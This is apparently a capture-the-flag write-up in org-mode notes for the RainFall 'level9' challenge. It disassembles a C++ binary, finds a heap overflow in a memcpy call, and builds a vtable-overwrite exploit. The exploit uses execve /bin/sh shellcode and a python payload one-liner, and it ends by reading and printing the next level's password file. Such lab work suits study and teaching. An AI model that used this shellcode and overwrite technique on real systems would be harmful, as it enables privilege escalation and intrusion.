* Data Gathering
**  strings
#+begin_src shell
readelf -p .rodata level9


String dump of section '.rodata':
  [     c]  T<0x88>^D^H:<0x87>^D^HN  -> ??
  [    20]  P                        -> ??
#+end_src

**  see functions
#+begin_src shell
(gdb)  info functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484d0  std::ios_base::Init::Init()
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int) -> C++?
0x08048530  _Znwj@plt
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int) -> C++?
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int) -> C++?
0x080486f6  N::N(int) -> C++?
0x0804870e  N::setAnnotation(char*) -> C++?
0x0804873a  N::operator+(N&) -> C++?
0x0804874e  N::operator-(N&) -> C++?

0x0804881c  _fin
#+end_src

* Binary Analisis.
** disass functions
#+begin_src shell
  (gdb) disass 0x0804870e
  Dump of assembler code for function _ZN1N13setAnnotationEPc:
     0x0804870e <+0>:	push   ebp
     0x0804870f <+1>:	mov    ebp,esp
     0x08048711 <+3>:	sub    esp,0x18
     0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
     0x08048717 <+9>:	mov    DWORD PTR [esp],eax -> argv[1]
     0x0804871a <+12>:	call   0x8048520 <strlen@plt>
     0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8] -> buffer to write
     0x08048722 <+20>:	add    edx,0x4 -> buffer to write 
     0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
     0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
     0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
     0x08048730 <+34>:	mov    DWORD PTR [esp],edx -> src
     0x08048733 <+37>:	call   0x8048510 <memcpy@plt> -> overflow heap/stack
     0x08048738 <+42>:	leave  
     0x08048739 <+43>:	ret    
  End of assembler dump.
 
  (gdb) disass 0x080486f6 -> N constructor.
  Dump of assembler code for function _ZN1NC2Ei:
     0x080486f6 <+0>:	push   ebp
     0x080486f7 <+1>:	mov    ebp,esp
     0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
     0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
     0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
     0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
     0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
     0x0804870b <+21>:	pop    ebp
     0x0804870c <+22>:	ret    
  End of assembler dump.
  (gdb) disassemble 0x0804873a
  Dump of assembler code for function _ZN1NplERS_:
     0x0804873a <+0>:	push   ebp
     0x0804873b <+1>:	mov    ebp,esp
     0x0804873d <+3>:	mov    eax,DWORD PTR [ebp+0x8]
     0x08048740 <+6>:	mov    edx,DWORD PTR [eax+0x68]
     0x08048743 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
     0x08048746 <+12>:	mov    eax,DWORD PTR [eax+0x68]
     0x08048749 <+15>:	add    eax,edx
     0x0804874b <+17>:	pop    ebp
     0x0804874c <+18>:	ret    
  End of assembler dump.
  (gdb) disassemble 0x0804874e
  Dump of assembler code for function _ZN1NmiERS_:
     0x0804874e <+0>:	push   ebp
     0x0804874f <+1>:	mov    ebp,esp
     0x08048751 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
     0x08048754 <+6>:	mov    edx,DWORD PTR [eax+0x68]
     0x08048757 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
     0x0804875a <+12>:	mov    eax,DWORD PTR [eax+0x68]
     0x0804875d <+15>:	mov    ecx,edx
     0x0804875f <+17>:	sub    ecx,eax
     0x08048761 <+19>:	mov    eax,ecx
     0x08048763 <+21>:	pop    ebp
     0x08048764 <+22>:	ret    
  End of assembler dump.
  disass main
  Dump of assembler code for function main:
     0x080485f4 <+0>:	push   ebp
     0x080485f5 <+1>:	mov    ebp,esp
     0x080485f7 <+3>:	push   ebx
     0x080485f8 <+4>:	and    esp,0xfffffff0
     0x080485fb <+7>:	sub    esp,0x20 -> 32 bytes of locals
     0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1 -> cmp argc, 1
     0x08048602 <+14>:	jg     0x8048610 <main+28> -> jmp if argc > 1
     0x08048604 <+16>:	mov    DWORD PTR [esp],0x1 if argc <= 1
     0x0804860b <+23>:	call   0x80484f0 <_exit@plt> exit 1
     0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c -> set value to constructor
     0x08048617 <+35>:	call   0x8048530 <_Znwj@plt> -> New | heap
     0x0804861c <+40>:	mov    ebx,eax
     0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
     0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
     0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei> -> constructor
     0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
     0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
     0x08048639 <+69>:	call   0x8048530 <_Znwj@plt> -> New | heap
     0x0804863e <+74>:	mov    ebx,eax
     0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
     0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
     0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei> -> constructor
     0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
     0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
     0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
     0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
     0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
     0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
     0x08048667 <+115>:	add    eax,0x4
     0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
     0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
     0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
     0x08048674 <+128>:	mov    DWORD PTR [esp],eax
     0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> -> method
     0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
     0x08048680 <+140>:	mov    eax,DWORD PTR [eax] -> de ref
     0x08048682 <+142>:	mov    edx,DWORD PTR [eax] -> de ref again
     0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
     0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
     0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
     0x08048690 <+156>:	mov    DWORD PTR [esp],eax
     0x08048693 <+159>:	call   edx                      ->i need to make this a shellcode
     0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
     0x08048698 <+164>:	leave  
     0x08048699 <+165>:	ret    
#+end_src
* Explotation
Need parameters.
#+begin_src shell
level9@RainFall:~$ ltrace ./level9 a
__libc_start_main(0x80485f4, 2, 0xbffffcf4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffffcf4, 0xbffffd00, 0xb7d79e55, 0xb7fed280) = 0x804a008 -> 108 size of class
_Znwj(108, 5, 0xbffffd00, 0xb7d79e55, 0xb7fed280)      = 0x804a078 -> 5 param pass to constructor
strlen("a")                                            = 1
memcpy(0x0804a00c, "a", 1)                             = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11)


#+end_src
if strlen argv[1] > that object size heap overflow.
offset = 8 + 4 = 12 bytes
obj size = 108 bytes
memcpy overflow when str > 108 B 
#+begin_src shell
i r eax
eax            0x41366441	1094083649 -> 108
## may i need to use a shellcode located with set Annotation and overflow
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax] -> de ref
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] -> de ref again
## i need the buffer address
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) r "AAAA"
(gdb) x $eax
0x804a00c:	0x41414141
buffer_addr = 0x804a00c
#+end_src
## exploit
### write on vtable next N instance
points to the buffer -> when deref ->  points to the shellcode -> call shellcode
x $eax + 4
0x804a010:	0x00000000
shellcode_addr = address of shellcode -0x804a010
shellcode
### shellcode
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
#+begin_src shell
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> -> method
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax] -> de ref
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] -> de ref again
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx                      ->i need to make this a shellcode

#+end_src
#
payload should work this way -> overwrite edx for get the shellcode when call it
4 that i need to write the function in the following instance. this is gonna be deref two times.
overwrite function ptr = ptr begin of payload = ptr begin shellcode -> begin

             4 B       28 B        76 B        4 B
payload : shell_addr + shellcode + padding + buffer_addr
          [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
                    shellcode ptr ->   shellcode                                                                           ->         padding ->  ptr to shellcode ptr
payload
python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"' | xxd
0000000: 10a0 0408 31c0 5068 2f2f 7368 682f 6269  ....1.Ph//shh/bi
0000010: 6e89 e350 5389 e1b0 0bcd 8041 4141 4141  n..PS......AAAAA
0000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000060: 4141 4141 4141 410c a004 080a            AAAAAAA.....


#+begin_src shell
 ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
#+end_src
